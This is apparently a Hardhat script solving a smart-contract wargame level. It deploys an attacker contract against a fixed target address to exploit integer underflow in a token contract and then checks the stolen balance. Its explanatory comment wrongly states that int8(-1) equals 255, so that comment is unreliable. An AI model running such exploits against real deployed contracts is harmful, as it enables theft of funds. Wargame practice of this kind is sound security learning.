import { Contract } from "ethers";
import { ethers } from "hardhat";
import { deployContract } from "../../utils/deployContract";
import { abi } from "../../artifacts/contracts/5.Token/Token.sol/Token.json";
import { displayResult } from "../../utils/displayResult";

const targetAddress = "0x90f2Ff12f2b64C17cbDD812bF87a1dd412a97FEb";

async function main() {
  const [attacker] = await ethers.getSigners();
  const tokenAttacker = await deployContract("TokenAttacker", attacker, [
    targetAddress,
  ]);
  const tokenTarget = new Contract(targetAddress, abi, attacker);
  // get tokenTarget max supply
  const pendingTx = await tokenAttacker.attack();
  await pendingTx.wait();
  const balance = await tokenTarget
    .connect(attacker)
    .balanceOf(attacker.address);
  displayResult(balance.gt(20));
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

/* Explanation :
Before Solidity 0.8.0, overflow and underflow did not throw an error. Instead,
the result was truncated to the size of the type. This is called wrapping.
For example, uint8(256) is 0, and int8(-1) is 255. 
This is a common source of bugs, and it is recommended to use SafeMath library 
to avoid these issues.

*/
